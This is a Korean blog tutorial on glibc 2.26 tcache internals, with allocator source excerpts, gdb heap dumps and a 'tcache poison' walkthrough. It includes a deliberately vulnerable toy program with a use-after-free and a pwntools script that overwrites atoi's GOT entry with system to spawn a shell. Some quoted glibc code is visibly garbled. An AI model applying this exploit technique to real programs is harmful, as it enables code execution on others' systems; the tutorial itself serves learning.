---
title: Tcache
date: 2019-02-17
---

glibc 2.26 부터 생긴 새로운..? bin 같은 녀석이다.

사실 왜 만든건진 모르겠다. 빠르게 편하게 사용하고자 한 것 같은데 문제는 검증이 1조차 없다. (우분투 18.04 기준으로 19는 모르겠다)

대표적인게 tcache poison 이 있다. (패빈 공격과 매우 흡사한데 훨씬 편하다.)

```c
typedef struct tcache_entry
{
  struct tcache_entry *next;
} tcache_entry;
 
/* There is one of these for each thread, which contains the
   per-thread cache (hence "tcache_perthread_struct").  Keeping
   overall size low is mildly important.  Note that COUNTS and ENTRIES
   are redundant (we could have just counted the linked list each
   time), this is for performance reasons.  */
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
 
static __thread char tcache_shutting_down = 0;
static __thread tcache_perthread_struct *tcache = NULL;
```

glibc 2.26 기준의 소스 

malloc에 추가된 티캐시이다. 

struct tcache_entry는 free chunk를 tcache 리스트에 유지하는 데 사용된다. 

struct tcache_perthread_strcut는 tcache 리스트에 속한 모든 free chunk를 유지하는데 사용된다.

```c
/* Caller must ensure that we know tc_idx is valid and there's room
   for more chunks.  */
static void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
 
/* Caller must ensure that we know tc_idx is valid and there's
   available chunks to remove.  */
static void *
tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  assert (tc_idx entries[tc_idx] > 0);
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  return (void *) e;
}
```

tcache chunk의 할당과 해제를 지원하기 위한 소스

tcache_put은 tcache->entries에서 chunk를 프리해주는 __int_free와 유사하다.

tcache_get은 __int_malloc과 유사하다.

위의 코드에서 tcache_entries가 single link와 같은 구조를 가지고 있다는 것을 알 수 있다!

tcache_entries는 패스트 빈과 아주 유사하다.

```c
void *__libc_malloc (size_t bytes)
{
  mstate ar_ptr;
  void *victim;
#if USE_TCACHE
  /* int_free also calls request2size, be careful to not pad twice.  */
  size_t tbytes = request2size (bytes);
  size_t tc_idx = csize2tidx (tbytes);
 
  MAYBE_INIT_TCACHE ();
 
  DIAG_PUSH_NEEDS_COMMENT;
  if (tc_idx < mp_.tcache_bins
      /*&& tc_idx entries[tc_idx] != NULL)
    {
      return tcache_get (tc_idx);
    }
  DIAG_POP_NEEDS_COMMENT;
#endif
  arena_get (ar_ptr, bytes);
  victim = _int_malloc (ar_ptr, bytes);
  return victim;
}
```

__libc_malloc의 소스

할당자가 먼저 tcache_entries를 통해 적절한 chunk를 반환하는 것을 알 수 있다. tcache 목록에 요청된 chunk가 있다면 할당자는 __int_malloc을 호출하지 않을 것 이다.

```c
#if USE_TCACHE
/* While we're here, if we see other chunks of the same size,
   stash them in the tcache.  */
size_t tc_idx = csize2tidx (nb);
if (tcache && tc_idx counts[tc_idx] < mp_.tcache_count && (pp = *fb) != NULL)
      {
          REMOVE_FB (fb, tc_victim, pp);
          if (tc_victim != 0)
          {
               tcache_put (tc_victim, tc_idx);
          }
      }
}
```

fastbin 할당 절차에서 한 가지 더 추가된 운영이 있는데 할당자가 fastbin에서 chunk를 검색한 후 현재 요청된 크기의 모든 chunk를 fastbin에서 제거 하고 tcache 리스트로 이동한다.

```c
#include <stdio.h>
#include <stdlib.h>

int main() {

	int *c, *c1, *c2;
	c = malloc(0x20);
	c1 = malloc(0x20);
	c2 = malloc(0x20);

	free(c1);
	free(c);
}
```

간단한 예제 코드다.

```c
gdb-peda$ par
addr                prev                size                 status              fd                bk
0x555555756000      0x0                 0x250                Used                None              None
0x555555756250      0x0                 0x30                 Used                None              None
0x555555756280      0x0                 0x30                 Used                None              None
0x5555557562b0      0x0                 0x30                 Used                None              None
```

우분투 18.04에서는 특이하게 힙에 티캐시 구조체가 할당된다.

```c
gdb-peda$ x/32gx 0x555555756000
0x555555756000:	0x0000000000000000	0x0000000000000251
0x555555756010:	0x000000000000[02]00	0x0000000000000000 <- tcache list count
0x555555756020:	0x0000000000000000	0x0000000000000000
0x555555756030:	0x0000000000000000	0x0000000000000000
0x555555756040:	0x0000000000000000	0x0000000000000000
0x555555756050:	0x0000000000000000	[0x0000555555756260] <- list header
```

c1, c를 free 하게 되면 tcache 항목의 count가 설정되고 list의 header도 설정된다.

```c
gdb-peda$ x/32gx 0x555555756250
0x555555756250:	0x0000000000000000	0x0000000000000031
0x555555756260:	0x0000555555756290	0x0000000000000000
0x555555756270:	0x0000000000000000	0x0000000000000000
0x555555756280:	0x0000000000000000	0x0000000000000031
0x555555756290:	0x0000000000000000	0x0000000000000000
0x5555557562a0:	0x0000000000000000	0x0000000000000000
0x5555557562b0:	0x0000000000000000	0x0000000000000031
0x5555557562c0:	0x0000000000000000	0x0000000000000000
0x5555557562d0:	0x0000000000000000	0x0000000000000000
0x5555557562e0:	0x0000000000000000	0x0000000000020d21

                  top: 0x5555557562e0 (size : 0x20d20)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x0
(0x30)   tcache_entry[1](2): 0x555555756260 --> 0x555555756290
```

이런 식으로 동작 자체는 fast bin과 매우 흡사하다!



# Tcache Poison

fastbin attack과 유사한 공격

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char * buf;

void menu() {
	puts("1.add");
	puts("2.write");
	puts("3.print");
	puts("4.delete");
	printf("> ");
}

void ec() {
	system("echo Hello guys~");
}

void ma() {
	buf = malloc(0x20);
}

void re() {
	read(0,buf,0x20);
}

void wr() {
	printf("%s",buf);
}

void fr() {
	free(buf);
}

int main() {
	char a[20];
	int b;

	setvbuf(stdin,NULL,_IONBF,0);
    setvbuf(stdout,NULL,_IONBF,0);

    ec();

    while(1) {
    	menu();
    	read(0,a,0x30);
    	b = atoi(a);
    	switch(b) {
    		case 1: ma(); break;
    		case 2: re(); break;
    		case 3:	wr(); break;
    		case 4: fr(); break;
    		default : puts("bye~"); return 0;
    	}
    }
}
```

예제 코드!

read를 이용해서 할당된 영역에 값을 쓸 수 있다. 

```c
===================  Arena 1  ====================
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x249b280 (size : 0x20d80)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x0
(0x30)   tcache_entry[1](1): 0x249b260
```

chunk 하나를 할당하고 해제하면 tcache 목록에 들어가게 된다. 포인터를 안 지웠으니 free 된 chunk에 임의의 값을 넣을 수 있다.

```c
gdb-peda$ x/32gx 0x15e9250
0x15e9250:	0x0000000000000000	0x0000000000000031
0x15e9260:	0x0000000000601060	0x000000000000000a
0x15e9270:	0x0000000000000000	0x0000000000000000

===================  Arena 1  ====================
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x249b280 (size : 0x20d80)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x0
(0x30)   tcache_entry[1](1): 0x15e9260 --> 0x601060 --> 0x7f52ed5e2680 --> 0xaba08ec8348 (invaild memory)
```

이렇게 tcache 목록에 들어가게 된다. 이 상태에서 2개의 malloc을 할당하면 0x601060에 특정 값을 또 쓸 수 있다.

```c
gdb-peda$ x/gx 0x601060
0x601060:	0x0000000000400690
```

atot got 에 system plt를 넣고 메뉴 선택할 때 /bin/sh를 넣어주면 쉘을 획득할 수 있다.

```python
from pwn import *

t = process('./tcache')

s = lambda a: t.sendlineafter('>',str(a))
#r = lambda : t.recvuntil('> ')
s(1)
s(4)
s(2)
pause()
t.sendline(p64(0x601060))
s(1)
s(1)
s(2)
pause()
t.sendline(p64(0x400690))
s('/bin/sh\x00')
t.interactive()
->
1.add
2.write
3.print
4.delete
> $ id
uid=1000(bskim)
```



#### 참고

https://dangokyo.me/2018/01/16/extra-heap-exploitation-tcache-and-potential-exploitation/